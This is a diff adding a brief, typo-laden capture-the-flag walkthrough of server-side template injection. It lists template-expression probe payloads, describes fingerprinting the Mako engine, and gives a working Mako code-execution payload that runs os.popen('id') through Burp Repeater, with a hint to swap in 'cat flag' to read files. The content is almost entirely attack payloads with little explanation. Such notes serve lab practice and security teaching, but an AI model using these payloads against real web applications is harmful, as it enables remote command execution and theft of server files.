@@ -1,0 +1,21 @@
+{{7*7}}
+${7*7}
+${{7*7}}
+<%= 7*7 %>
+#{7*7}
+try this
+answer is: ${7*7}
+it has server-side template injection vulnerability
+now we should identify template engine
+so now try $a{*pass ethical hacking*}b it works as a comment. failed
+lets try ${"z".join("ab")}. the output is azb. it works. so it is mako
+engine is found now create code
+go burpsuit, enter url, write command and go repeater
+name=
+<%
+import os
+x=os.popen('id').read()
+%>
+${x}
+
+cahnge id - cat flag
